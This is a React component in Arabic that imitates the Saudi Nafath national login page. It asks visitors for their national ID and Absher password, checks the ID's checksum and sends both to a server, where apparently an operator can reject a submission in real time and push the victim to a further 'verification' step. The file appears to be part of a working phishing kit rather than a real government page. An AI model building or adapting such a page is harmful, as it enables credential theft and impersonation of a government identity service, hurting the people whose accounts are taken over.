import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";
import { Controller, FieldValues, useForm } from "react-hook-form";
import {
  Button,
  createTheme,
  FormControl,
  InputLabel,
  OutlinedInput,
  Stack,
  ThemeProvider,
  InputAdornment,
} from "@mui/material";
import LockOutlinedIcon from "@mui/icons-material/LockOutlined";
import Person2OutlinedIcon from "@mui/icons-material/Person2Outlined";
import Main from "@/components/Main";

const customTheme = createTheme({
  direction: "rtl",
  typography: {
    fontFamily: "Cairo, Roboto, sans-serif",
  },
  palette: {
    primary: {
      main: "#029b90",
    },
  },
});

function Nafath() {
  const {
    control,
    handleSubmit,
    reset,
    formState: { isValid, errors },
  } = useForm({
    mode: "onChange",
    defaultValues: { idNumber: "", password: "" },
  });

  function sendData(data: FieldValues) {
    const { idNumber, password } = data;
    sendDataToServer({
      data: { "رقم الهوية": idNumber, "كلمة المرور": password },
      current: "تسجيل دخول نفاذ",
      nextPage: "تحقق نفاذ",
    });
  }

  useEffect(() => setCurrentPage("تسجيل دخول نفاذ"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value]);

  function isValidSaudiID(id: string): boolean {
    if (!/^[12]\d{9}$/.test(id)) return false;

    let sum = 0;
    for (let i = 0; i < 10; i++) {
      let digit = parseInt(id.charAt(i));
      if ((i + 1) % 2 !== 0) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }

    return sum % 10 === 0;
  }

  return (
    <Main variant="filled">
      <ThemeProvider theme={customTheme}>
        <form
          className="flex flex-col gap-2 max-w-lg mx-auto rounded-2xl"
          style={{ flexDirection: "column", justifyContent: "space-between" }}
          onSubmit={handleSubmit(sendData)}
        >
          <img
            src="/images/nafath.png"
            alt="mobile header image"
            className="w-40 mx-auto mb-4"
          />
          <p className="text-xl font-black text-[hsl(176,97%,30%)] w-fit mx-auto mb-8">
            دخول سريع وآمن
          </p>
          <h2 className="mb-5 text-lg font-bold text-gray-500 text-center">
            الرجاء ادخال رقم الهوية و كلمة المرور الخاصة بهويتك الرقمية (أبشر)
          </h2>
          <div className="max-w-full">
            <p className="text-lg font-bold text-[hsl(176,97%,30%)] w-fit mb-4">
              مرحباً بك في خدمة النفاذ الوطني الموحد.
            </p>
          </div>

          <div className="space-y-2">
            <Stack>
              <FormControl fullWidth size="small" margin="normal">
                <InputLabel htmlFor="idNumber">رقم الهوية</InputLabel>
                <Controller
                  name="idNumber"
                  control={control}
                  rules={{
                    required: "يرجى إدخال رقم الهوية",
                    validate: (value) => {
                      const cleaned = value.replace(/[^\d]/g, "");
                      if (
                        cleaned.length !== 10 ||
                        !/^1|2/.test(cleaned) ||
                        !isValidSaudiID(cleaned)
                      )
                        return "رقم الهوية غير صحيح";
                      return true;
                    },
                  }}
                  render={({ field }) => (
                    <OutlinedInput
                      {...field}
                      dir="ltr"
                      sx={{
                        backgroundColor: "rgb(246 246 246)",
                        borderRadius: "100px",
                      }}
                      startAdornment={
                        <InputAdornment position="start">
                          <Person2OutlinedIcon />
                        </InputAdornment>
                      }
                      id="idNumber"
                      type="tel"
                      onChange={(e) => {
                        let rawValue = e.target.value.replace(/[^\d]/g, "");
                        if (rawValue.length > 10) {
                          rawValue = rawValue.slice(0, 10);
                        }
                        field.onChange(rawValue);
                      }}
                      inputProps={{ maxLength: 10 }}
                      label="رقم الهوية"
                    />
                  )}
                />
                {errors.idNumber && (
                  <span className="text-red-500 text-sm mt-1">
                    {errors.idNumber.message}
                  </span>
                )}
              </FormControl>
            </Stack>
          </div>
          <div className="space-y-2">
            <Stack>
              <FormControl fullWidth size="small" margin="normal">
                <InputLabel htmlFor="password">كلمة المرور</InputLabel>
                <Controller
                  name="password"
                  control={control}
                  rules={{
                    required: "ادخل كلمة المرور",
                  }}
                  render={({ field }) => (
                    <OutlinedInput
                      {...field}
                      dir="ltr"
                      sx={{
                        backgroundColor: "rgb(246 246 246)",
                        borderRadius: "100px",
                      }}
                      startAdornment={
                        <InputAdornment position="start">
                          <LockOutlinedIcon />
                        </InputAdornment>
                      }
                      id="password"
                      type="password"
                      label="كلمة المرور"
                    />
                  )}
                />
              </FormControl>
            </Stack>
          </div>

          {isFormRejected.value && (
            <Stack className="font-medium my-5 text-red-500 text-center">
              رقم الهوية او كلمة المرور غير صحيحة
            </Stack>
          )}

          <Button
            fullWidth
            sx={{ borderRadius: "200px" }}
            variant="contained"
            size="large"
            className="ms-auto w-fit mt-6"
            disabled={!isValid}
            type="submit"
          >
            التالي
          </Button>
          <p className="text-center text-sm font-medium">
            يرجى فتح تطبيق نفاذ لإصدار شريحة اعتماد رقم الجوال.
          </p>
          <img
            src="/images/below-nafaz.png"
            alt="nafaz footer image"
            className="mt-4"
          />
        </form>
      </ThemeProvider>
    </Main>
  );
}

export default Nafath;
